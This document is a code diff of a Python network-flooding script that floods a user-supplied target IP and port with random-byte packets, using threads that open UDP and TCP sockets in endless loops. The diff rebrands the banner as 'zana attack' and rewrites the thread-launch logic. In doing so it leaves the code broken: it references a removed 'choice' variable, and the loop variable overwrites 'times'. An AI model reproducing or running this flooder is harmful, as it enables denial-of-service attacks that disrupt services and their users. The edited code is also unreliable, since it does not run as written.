@@ -40,16 +40,15 @@ while attemps < 100:
 
 ip = str(input("\033[95m Target IP :\033[0m"))
 port = int(input("\033[94m Target Port :\033[0m"))
-choice = str(input("\033[31m (y/n) :\033[0m"))
 times = int(input("\033[33m Time :\033[0m"))
 threads = int(input("\033[37m Threads :\033[0m"))
 
 time.sleep(5),
-print("\033[33m  ⟩⟩  KALA DUNIA DIAM \033[0m "),
+print("\033[33m  ⟩⟩  Welcome to zana attack....!!! \033[0m "),
 
 def run():
 	data = random._urandom(1024)
-	i = random.choice(("[+]","[*]","[!]","[-]"))
+	i = random.choice(("[💥]","[🚀]","[🔥]"))
 	while True:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -63,7 +62,7 @@ def run():
 
 def run2():
 	data = random._urandom(999)
-	i = random.choice(("[+]","[*]","[!]","[-]"))
+	i = random.choice(("[💥]","[🚀]","[🔥]"))
 	while True:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -80,12 +79,10 @@ def run2():
 
 
 			
-for y in range(threads):
-	if choice == 'y':
+for times in range(threads):
+	if choice == 'Time':
 		th = threading.Thread(target = run)
 		th.start()
-		th = threading.Thread(target = run2)
-		th.start()
 	else:
-	        th = threading.Thread(target = run3)
+	        th = threading.Thread(target = run2)
 		
